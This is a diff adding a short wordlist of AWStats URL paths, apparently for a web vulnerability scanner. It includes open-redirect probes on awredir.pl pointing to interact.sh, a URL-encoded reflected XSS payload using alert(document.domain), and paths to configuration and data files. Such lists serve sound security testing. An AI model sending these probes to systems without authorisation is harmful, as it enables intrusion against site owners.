@@ -1,0 +1,12 @@
+/awstats/
+/awstats.conf
+/awstats.pl
+/logs/awstats.pl
+/webstats/awstats.pl
+/awstats/data
+/awstats/awredir.pl?url=interact.sh
+/cgi-bin/awstats/awredir.pl?url=interact.sh
+/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/cgi-bin/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/awstats/awredir.pl?url=example.com
+/cgi-bin/awstats/awredir.pl?url=example.com
